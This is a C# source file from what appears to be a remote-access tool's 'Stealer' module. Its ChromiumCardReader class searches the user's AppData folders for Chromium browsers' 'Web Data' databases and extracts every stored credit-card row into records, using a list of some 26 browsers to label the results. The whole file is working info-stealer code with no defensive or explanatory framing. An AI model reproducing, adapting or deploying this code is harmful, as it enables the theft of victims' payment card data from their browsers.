using FKRemoteDesktop.Message.MessageStructs;
using FKRemoteDesktop.Stealer.DB;
using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

//--------------------------------------------------------------------------------------
namespace FKRemoteDesktop.Stealer.Browsers
{
    public class ChromiumCardReader : IAccountReader
    {
        private class PassData
        {
            public string Url { get; set; }
            public string Login { get; set; }
            public string Password { get; set; }
        }

        public string ApplicationName => "Chromium 内核浏览器";
        public string KeyName => "Credit Cards";
        public static readonly string AppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        public static readonly string LocalData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

        public static readonly string[] ChromiumBrowsersName = new string[] {
                "Chrome", "Edge", "Yandex", "Orbitum", "Opera", "Amigo", "Torch", "Comodo", "CentBrowser", "Go!", "uCozMedia", "Rockmelt",
                "Sleipnir", "SRWare Iron", "Vivaldi", "Sputnik", "Maxthon", "AcWebBrowser", "Epic Browser", "MapleStudio", "BlackHawk",
                "Flock", "CoolNovo", "Baidu Spark", "Titan Browser", "Google",
            };

        public IEnumerable<RecoveredAccount> ReadAccounts()
        {
            List<RecoveredAccount> result = new List<RecoveredAccount>();
            try
            {
                List<string> Browsers = new List<string>();
                List<string> BrowserPaths = new List<string> { AppData, LocalData };
                var APD = new List<string>();
                foreach (var paths in BrowserPaths)
                {
                    try
                    {
                        APD.AddRange(Directory.GetDirectories(paths));
                    }
                    catch { }
                }

                foreach (var apdPath in APD)
                {
                    string[] files = null;
                    try
                    {
                        Browsers.AddRange(Directory.GetFiles(apdPath, "Web Data", SearchOption.AllDirectories));
                        files = Directory.GetFiles(apdPath, "Web Data", SearchOption.AllDirectories);
                    }
                    catch { }

                    if (files != null)
                    {
                        foreach (var file in files)
                        {
                            try
                            {
                                if (File.Exists(file))
                                {
                                    string browserName = $"Unknown";
                                    foreach (string name in ChromiumBrowsersName)
                                    {
                                        if (apdPath.Contains(name))
                                        {
                                            browserName = name;
                                        }
                                    }
                                    string loginData = file;

                                    SQLHandler sqlHandler = new SQLHandler(loginData);
                                    List<PassData> passDataList = new List<PassData>();
                                    sqlHandler.ReadTable("credit_cards");

                                    int dataCount = sqlHandler.GetRowCount();
                                    for (int dataIndex = 0; dataIndex < dataCount; ++dataIndex)
                                    {
                                        try
                                        {
                                            int nColumnCount = sqlHandler.GetColumnCount();
                                            string sDataInfo = "";
                                            for (int nColumnIndex = 0; nColumnIndex < nColumnCount; ++nColumnIndex)
                                            {
                                                string key = sqlHandler.GetFieldName(nColumnIndex);
                                                string value = sqlHandler.GetValue(dataIndex, nColumnIndex);
                                                byte[] valueArrays = Encoding.Default.GetBytes(value);

                                                if (!String.IsNullOrEmpty(value))
                                                {
                                                    sDataInfo += string.Format("{0}=\"{1}\"\t", key, value);
                                                }
                                            }
                                            if (!String.IsNullOrEmpty(sDataInfo))
                                            {
                                                result.Add(new RecoveredAccount()
                                                {
                                                    Username = "N/A",
                                                    Password = "N/A",
                                                    Url = sDataInfo,
                                                    KeyName = KeyName,
                                                    Application = ApplicationName
                                                });
                                            }
                                        }
                                        catch { }
                                    }
                                }
                            }
                            catch { }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                result.Add(new RecoveredAccount()
                {
                    Username = "N/A",
                    Password = "N/A",
                    Url = ex.Message,
                    KeyName = KeyName,
                    Application = ApplicationName
                });
            }

            if (result.Count <= 0)
            {
                result.Add(new RecoveredAccount()
                {
                    Username = "N/A",
                    Password = "N/A",
                    Url = "N/A",
                    KeyName = KeyName,
                    Application = ApplicationName
                });
            }
            return result;
        }
    }
}